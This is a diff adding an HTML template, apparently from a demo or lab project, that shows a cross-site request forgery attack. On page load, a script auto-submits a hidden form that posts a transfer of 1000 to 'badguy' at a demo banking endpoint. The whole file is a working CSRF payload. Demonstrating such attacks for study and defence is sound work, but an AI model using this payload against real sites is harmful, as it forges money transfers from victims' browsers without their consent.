@@ -1,0 +1,25 @@
+{{define "autopost"}}<!DOCTYPE html>
+<html>
+<script>
+    function post() {
+        document.forms["badform"].submit();
+    }
+</script>
+<body onload="post()">
+
+<h2>There is a hidden form!</h2>
+
+<p>
+    Hidden form is the same behavior as normal form.<br>
+    Form submit!
+</p>
+
+<form name="badform" method="POST" action="http://domain1.com:1323/api/transfer2">
+    <input type="hidden" name="to" value="badguy">
+    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" value="Click to View Profile (Working)">
+</form>
+
+</body>
+</html>
+{{end}}
